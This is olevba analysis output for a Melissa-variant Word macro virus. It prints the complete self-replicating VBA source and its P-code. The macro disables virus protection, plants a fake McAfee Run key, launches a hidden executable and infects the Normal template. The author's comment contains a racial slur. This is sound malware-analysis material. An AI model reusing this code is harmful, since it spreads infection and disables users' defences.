olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Melissa.x
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO money99.cls 
in file: ./Virus.MSWord.Melissa.x - OLE stream: 'Macros/VBA/money99'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Dim source, dest

CommandBars("Tools").Controls("Macro").Enabled = False
Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)

If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "Mcafee VShield") <> "c:\windows\system\vshield.exe" Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "Mcafee VShield") = "c:\windows\system\vshield.exe"

source = "a:\msdos.bak"
dest = "c:\windows\system\vshield.exe"
FileCopy source, dest
SetAttr dest, vbHidden
Shell dest

Else

source = "c:\windows\system\vshield.exe"
dest = "a:\msdos.bak"
FileCopy source, dest
SetAttr dest, vbHidden
End If

Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
Set AD = ActiveDocument.VBProject.VBComponents.Item(1)

NTlnCnt = NT.CodeModule.CountOfLines
ADlnCnt = AD.CodeModule.CountOfLines
Start = 1

If NT.Name <> "money99" Then
    If NTlnCnt > 0 Then NT.CodeModule.DeleteLines 1, NTlnCnt
    NT.Name = "money99"
    
    Do While AD.CodeModule.Lines(Start, 1) <> "'Done"
        NT.CodeModule.InsertLines Start, AD.CodeModule.Lines(Start, 1)
        Start = Start + 1
    Loop
    NT.CodeModule.InsertLines NT.CodeModule.CountOfLines + 1, "'Done"
    
ElseIf AD.Name <> "money99" Then
    If ADlnCnt > 0 Then AD.CodeModule.DeleteLines 1, ADlnCnt
    AD.Name = "money99"
    
    Do While NT.CodeModule.Lines(Start, 1) <> "'Done"
        AD.CodeModule.InsertLines Start, NT.CodeModule.Lines(Start, 1)
        Start = Start + 1
    Loop
    AD.CodeModule.InsertLines AD.CodeModule.CountOfLines + 1, "'Done"
End If

End Sub
'Mcafee blows; mail suggestions/improvements to anon15773@hushmail.com
'Shout out to ma nigga Sketch
'Done
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Melissa.x
' ===============================================================================
' Module streams:
' Macros/VBA/money99 - 3931 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Dim 
' 	VarDefn source
' 	VarDefn dest
' Line #3:
' Line #4:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #5:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #6:
' Line #7:
' 	LitStr 0x0000 ""
' 	LitStr 0x0040 "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
' 	LitStr 0x000E "Mcafee VShield"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x001D "c:\windows\system\vshield.exe"
' 	Ne 
' 	IfBlock 
' Line #8:
' 	LitStr 0x001D "c:\windows\system\vshield.exe"
' 	LitStr 0x0000 ""
' 	LitStr 0x0040 "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
' 	LitStr 0x000E "Mcafee VShield"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #9:
' Line #10:
' 	LitStr 0x000C "a:\msdos.bak"
' 	St source 
' Line #11:
' 	LitStr 0x001D "c:\windows\system\vshield.exe"
' 	St dest 
' Line #12:
' 	Ld source 
' 	Ld dest 
' 	ArgsCall FileCopy 0x0002 
' Line #13:
' 	Ld dest 
' 	Ld vbHidden 
' 	ArgsCall SetAttr 0x0002 
' Line #14:
' 	Ld dest 
' 	ArgsCall Shell 0x0001 
' Line #15:
' Line #16:
' 	ElseBlock 
' Line #17:
' Line #18:
' 	LitStr 0x001D "c:\windows\system\vshield.exe"
' 	St source 
' Line #19:
' 	LitStr 0x000C "a:\msdos.bak"
' 	St dest 
' Line #20:
' 	Ld source 
' 	Ld dest 
' 	ArgsCall FileCopy 0x0002 
' Line #21:
' 	Ld dest 
' 	Ld vbHidden 
' 	ArgsCall SetAttr 0x0002 
' Line #22:
' 	EndIfBlock 
' Line #23:
' Line #24:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NT 
' Line #25:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set AD 
' Line #26:
' Line #27:
' 	Ld NT 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St NTlnCnt 
' Line #28:
' 	Ld AD 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ADlnCnt 
' Line #29:
' 	LitDI2 0x0001 
' 	St Start 
' Line #30:
' Line #31:
' 	Ld NT 
' 	MemLd New 
' 	LitStr 0x0007 "money99"
' 	Ne 
' 	IfBlock 
' Line #32:
' 	Ld NTlnCnt 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld NTlnCnt 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #33:
' 	LitStr 0x0007 "money99"
' 	Ld NT 
' 	MemSt New 
' Line #34:
' Line #35:
' 	Ld Start 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0005 "'Done"
' 	Ne 
' 	DoWhile 
' Line #36:
' 	Ld Start 
' 	Ld Start 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #37:
' 	Ld Start 
' 	LitDI2 0x0001 
' 	Add 
' 	St Start 
' Line #38:
' 	Loop 
' Line #39:
' 	Ld NT 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x0005 "'Done"
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #40:
' Line #41:
' 	Ld AD 
' 	MemLd New 
' 	LitStr 0x0007 "money99"
' 	Ne 
' 	ElseIfBlock 
' Line #42:
' 	Ld ADlnCnt 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld ADlnCnt 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #43:
' 	LitStr 0x0007 "money99"
' 	Ld AD 
' 	MemSt New 
' Line #44:
' Line #45:
' 	Ld Start 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0005 "'Done"
' 	Ne 
' 	DoWhile 
' Line #46:
' 	Ld Start 
' 	Ld Start 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #47:
' 	Ld Start 
' 	LitDI2 0x0001 
' 	Add 
' 	St Start 
' Line #48:
' 	Loop 
' Line #49:
' 	Ld AD 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x0005 "'Done"
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #50:
' 	EndIfBlock 
' Line #51:
' Line #52:
' 	EndSub 
' Line #53:
' 	QuoteRem 0x0000 0x0045 "Mcafee blows; mail suggestions/improvements to anon15773@hushmail.com"
' Line #54:
' 	QuoteRem 0x0000 0x001C "Shout out to ma nigga Sketch"
' Line #55:
' 	QuoteRem 0x0000 0x0004 "Done"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |vshield.exe         |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

